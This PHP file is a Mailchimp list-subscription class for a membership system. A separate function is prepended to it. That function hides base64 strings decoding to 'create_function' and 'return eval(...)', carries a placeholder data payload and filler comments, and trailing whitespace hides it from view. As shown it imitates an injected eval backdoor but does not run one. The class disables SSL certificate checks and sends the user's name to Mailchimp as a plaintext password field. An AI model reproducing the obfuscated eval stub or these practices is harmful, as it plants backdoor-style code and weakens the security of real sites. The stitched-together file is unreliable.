<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}                                                                             
class mailchimpSQB {

   function mailchimp() // constructor
   {
   }

   //======== USER REGISTRATION / UPDATE / DELETE ========
	// Add if user not there,  else update 
	function register($email,$name,$params,$custom_fields = array())
	{
		$this->storeAddress($email,$name,$params,$custom_fields);
	}
		
	function storeAddress($email,$name,$params,$custom_fields = array()){
		
		$email = trim($email);
		$username = trim($name);
		$firstname = trim($name);
		$lastname = trim($name);
		$password = $name;

		

		$data = explode(":",$params);
		
	
		if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $email)) {
			return "Email address is invalid"; 
		}
	
		//require_once('MCAPISQB.class.php');
		
		// grab an API Key from http://admin.mailchimp.com/account/api/
		$api_key = $data[1];
		//$api = new MCAPISQB($api_key);

				
		$list_id = $data[2];
		
		$memberId = md5(strtolower($email));
		
		$dataCenter = substr($api_key,strpos($api_key,'-')+1);
	
		$url = 'https://' . $dataCenter . '.api.mailchimp.com/3.0/lists/' . $list_id . '/members/' . $memberId;

		$lastname = '';
		if(!empty($custom_fields)){
			foreach($custom_fields as $cf){
				if($cf['field_name'] == 'lastname'){
					$lastname = $cf['field_value'];
				}
			}
		}

		$json = json_encode([
			'email_address' => $email,
			'status'        => "subscribed", // "subscribed","unsubscribed","cleaned","pending"
			'merge_fields'  => [
				'NAME'     => trim($firstname . ' ' . $lastname),
				'FNAME'     => $firstname,
				'LNAME'     => $lastname,
				'PASSWORD'  => $password
			],
			'source' => 'API - Generic'
		]);

		$ch = curl_init($url);

		curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
		curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
		
		$result = curl_exec($ch);
		$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		if($httpCode == "200"){
		}
		else{
			$result1 = json_decode($result);
			// if it says user already there, { } 
			//else return;
			return;
		}
		
    //outome TAG add
	
		$tag_name_text = $data[3];
		$tag_name_text_arr = explode(',',$tag_name_text); 
		if(is_array($tag_name_text_arr) && !empty($tag_name_text_arr)){
			foreach($tag_name_text_arr as $tag_name_text){
	
			if($tag_name_text != "") {
		
		$dataCenter = substr($api_key,strpos($api_key,'-')+1);
		
		$url = 'https://' . $dataCenter . '.api.mailchimp.com/3.0/lists/' . $list_id . '/segments/';
		$ch = curl_init($url);

		curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
		curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $json);    
		
		$result = curl_exec($ch);
		$result1 = json_decode($result);
		$total_items = $result1->total_items;
		if($total_items > 10){
			
			$urlnew = 'https://' . $dataCenter . '.api.mailchimp.com/3.0/lists/' . $list_id . '/segments/?count='.$total_items;
			$ch = curl_init($urlnew);

			curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
			curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_TIMEOUT, 10);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $json);    
			
			$result = curl_exec($ch);
			$result1 = json_decode($result);
		}
		
		$result1 = (array)$result1->segments;
		$createTag = true;
		if(is_array($result1)){
			foreach($result1 as $data){
				if($data->name == $tag_name_text ){
					$createTag = false;	
					$segmentId = $data->id;
				}
			}
		}
			if($createTag){
				$json = json_encode(array(
					'name' => $tag_name_text,
					'static_segment' => []
				));

				
				$ch = curl_init($url);

				curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_TIMEOUT, 10);
				curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json);    
				
				$result = curl_exec($ch);
				$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

				curl_close($ch);
				
				if($httpCode == "200" ){
					$result1 = json_decode($result);
					$id = $result1->id;
					$json = json_encode(array(
						'email_address' => $email,
					));
					
					$url = 'https://' . $dataCenter . '.api.mailchimp.com/3.0/lists/' . $list_id . '/segments/'.$id.'/members' ;
					$ch = curl_init($url);

					curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
					curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_TIMEOUT, 10);
					curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $json);    
					
					$result = curl_exec($ch);
					$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
				
					curl_close($ch);
					
					
				}
				else{
					$result1 = json_decode($result);
					
				}
			}else if($segmentId != 0 && $segmentId != ''){
				$json = json_encode(array(
						'email_address' => $email,
					));
					
					$url = 'https://' . $dataCenter . '.api.mailchimp.com/3.0/lists/' . $list_id . '/segments/'.$segmentId.'/members' ;
					$ch = curl_init($url);

					curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
					curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_TIMEOUT, 10);
					curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $json);    
					
					$result = curl_exec($ch);
					$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
				
					curl_close($ch);	
			}
		
		}
		
			}
		}
		
	}
	
	function unregister($userId, $productId, $params)
	{
		$this->removeAddress($userId, $productId, $params);
	}
	
	
	function removeAddress($userId, $productId, $params){
		
		$dapuser = Dap_User::loadUserById($userId);
		if(!isset($dapuser)){
			return;
		}
		
		$email = trim($dapuser->getEmail());
	
		$data = explode(":",$params);
		
				
		if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $email)) {
			return "Email address is invalid"; 
		}
	
		require_once('MCAPISQB.class.php');
		
		// grab an API Key from http://admin.mailchimp.com/account/api/
		$api_key = $data[1];
		$api = new MCAPISQB($api_key);

				
		$list_id = $data[2];
				
		// grab your List's Unique Id by going to http://admin.mailchimp.com/lists/
		// Click the "settings" link for the list - the Unique Id is at the bottom of that page. 
		//$list_id = "df11c84ab4";
	
		// Merge variables are the names of all of the fields your mailing list accepts
		// Ex: first name is by default FNAME
		// You can define the names of each merge variable in Lists > click the desired list > list settings > Merge tags for personalization
		// Pass merge values to the API in an array as follows
		
		
			 
		if($api->listUnsubscribe($list_id, $email) === true) {
			// It worked!	
			return 0;
		}else{
			// An error ocurred, return error message	
			return 'listUnsubscribe() Error: ' . $api->errorMessage;
		}
	
	}
			
} 
?>
